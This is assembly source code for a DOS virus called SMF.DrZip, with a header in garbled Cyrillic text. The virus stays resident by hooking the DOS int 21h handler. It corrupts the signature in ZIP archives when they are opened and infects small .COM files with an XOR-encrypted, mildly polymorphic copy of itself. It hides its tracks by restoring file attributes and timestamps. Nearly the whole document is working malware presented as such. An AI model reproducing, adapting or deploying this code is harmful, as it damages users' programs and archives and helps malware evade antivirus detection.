   ; =============================== SMF.DrZip ================================
   ; I am sorry for 386 code :(
   ;
   ; è¨äàãîé¨©áï com-à¥§¨¤¥â, è¨äàã¥â ¦¥àâ¢ë.
   ; ¯®àâ¨â ZIP- àå¨¢ë â ª, çâ® DrWeb £«îç¨â ¯à¨ ¨å â¥áâ¨à®¢ ¨¨
   ; §  ®á®¢ã ¢§ïâ ¬®© SMF.Gift
   ; *®¤ ZipMagic95/98 ¥ à ¡®â ¥â (¥ ¯®àâ¨â  àå¨¢ë, ® à §¬®¦ ¥âáï)
   ; *®«¥¥ ¯®¤à®¡®¥ ®¯¨á ¨¥ - ¢ ¨áå®¤¨ª¥ SMF.Gift'a

   .model tiny
   .code
   .386
           org 0fff0h
   High1   label   ; maximal com-file
       org 100h

   Start:  mov bx,offset body
           mov cx,High1-body
   crypt:  xor byte ptr [bx],0
   crcode  equ $-1
       inc bx
           loop crypt
   body    equ $-1 ; crypt loop offset to complicate debugging this vir

       mov eax,'DRZW'
           int 21h ; check if we are already resident
       cmp eax,'WZRD'
           jz short VcStart
           push es ds
           mov ax,cs
           dec ax
           mov ds,ax   ; get segment of MCB
       sub word ptr ds:[3],(High1-Start-1)/16+1
       inc ax
           add ax,word ptr ds:[3]  ; calculate segment address for TSR
           mov es,ax
           mov si,100h
           xor di,di
           mov ds,di
           mov dx,ax
           sub dx,10h  ; dx=segment of TSR, addressable by offset 100h
           shl edx,16
           mov dx,offset Intr21
           xchg edx,ds:[84h]   ; addr. of int21 vector
           pop ds
           mov ds:[Old21],edx
           mov cx,virlen
           rep movsb
           pop es
   VcStart:mov si,offset Victim
       mov di,100h
           mov cx,High1-virend ; maximum possible victim length
           mov eax,0c3a4f3h    ; opcodes for "rep movsb,retn"
           mov ds:[0fch],eax
           push 100h
           push 0fch
           retn    ; run victim's code

   ; ================ NEW int21 handler =======================
   Intr21: cmp eax,'DRZW'
       jnz short noCheck
           mov eax,'WZRD'
           iret
   noCheck:pushf
       pusha
           push ds es
       cmp ah,3dh
       jnz short skipopen

           mov si,dx
   lp0:    inc si
       cmp byte ptr [si],0
           jnz short lp0
           mov eax,dword ptr [si-4]    ; get file extension
           or eax,20202000h    ; bring extention to downcase letters
           cmp eax,'piz.' ; it is '.ZIP' ?-))
       jnz short skipopen
       mov ax,3d02h    ; opens zip
       call Int21
       push cs
           pop ds
           xchg ax,bx
       xor cx,cx
           xor dx,dx
   lp1:    push cx dx  ; looking for signature
       mov ax,4200h
           call Int21
       mov cx,4
           mov ah,3fh
           mov dx,offset abc
           call Int21
       pop dx cx
           cmp ax,4
           jnz short done
           cmp word ptr [abc],4b50h
           jnz short none
           cmp word ptr [abc+2],403h
           jnz short none
       mov word ptr [dx1],dx   ; save LAST signature found
           mov word ptr [cx1],cx   ; in cx1/dx1
   none:   inc dx
       jnz short lp1
           inc cx
           jmp short lp1
   done:   mov cx,1234h
   cx1 equ $-2
       mov dx,1234h
   dx1 equ $-2
       mov ax,4200h
           call Int21
       mov ah,40h
           mov cx,4
           mov dx,offset def
           call Int21


   skipopen:
           mov ah,2fh
       call Int21  ; get search record(DTA) to es:bx
           push es
           pop ds
           mov edx,0
   old_size equ $-4
       mov eax,ds:[bx+18h] ; get date/size
           mov dword ptr cs:[old_size],eax
               ; this trick only to minimize suspicious disk access:
           cmp eax,edx ; if date/time changed from last search, then
           jz skip ; it is another file - let's check it
           mov bp,bx
           add bx,1eh
   scan:   inc bx
           cmp byte ptr ds:[bx],0
           jnz scan    ; search for end of file name
           cmp dword ptr ds:[bx-4],'MOC.'
           jnz skip    ; check for com-file
       cmp word ptr ds:[bp+1ah],offset High1-virend    ; check file size
           jae skip    ; don't infect long com-files
       mov ax,4301h
           lea dx,[bp+1eh]
           xor cx,cx
           call Int21  ; reset file attributes (for infecting R/O)
       mov ax,3d02h
           call Int21  ; open file for Read/Write
           jc skip ; file can't be opened
       xchg ax,bx
       push cs
           pop ds
           mov ah,3fh
           mov dx,offset Victim
           mov cx,0ffffh
           push dx
           call Int21  ; read file
           pop si
           cmp word ptr [si],'M'+100h*'Z' ; check for .exe
           jz close
           mov edx,dword ptr [Start]
       cmp edx,[si]
           jz close    ; check if we're already sick
           push ax

       add ax,39075
           ror ax,3
       add byte ptr cs:[crcode1],al    ; polymorphic :)
       add byte ptr cs:[crcode ],al

           mov ax,4200h
           xor dx,dx
           xor cx,cx
           call Int21  ; seek to begin of file

           mov dx,100h
           mov cx,body-start
           mov ah,40h
           call Int21  ; write decoder
           mov si,offset body
           pop cx  ; "pop" file length
           add cx,virend-body  ; size of output file
   crlp1:  mov dx,offset abc
       mov di,dx
       mov al,[si]
           xor al,0
   crcode1 equ $-1
           mov [di],al
           push cx
           mov cx,1
           mov ah,40h
       call Int21  ; write coded file
       pop cx
           inc si
           loop crlp1

       mov ax,5701h
           mov cx,es:[bp+16h]
           mov dx,es:[bp+18h]
           call Int21  ; restore original file time/date
   close:  mov ah,3eh
           call Int21
       mov ax,4301h
           lea dx,[bp+1eh]
           movzx cx,byte ptr es:[bp+15h]
           push es
           pop ds
           call Int21      ; restore old file attributes
   skip:   pop es ds
           popa
           popf
   I21:    db 0eah ; = jmp dword ptr cs:[Old21]
   Old21   dd 0
   Int21:  pushf
       call dword ptr cs:[Old21]   ; can't be replaced to jmp, because
           ret ; there is call far ... , but ret near...

   abc dd ?
   def dd 03034b50h
       db '[SMF.DrZip]'
   virend  label
   virlen  equ virend-Start

   ; ===========================================================================
   Victim: ret ; it's a host program
   ; ===========================================================================
       end Start
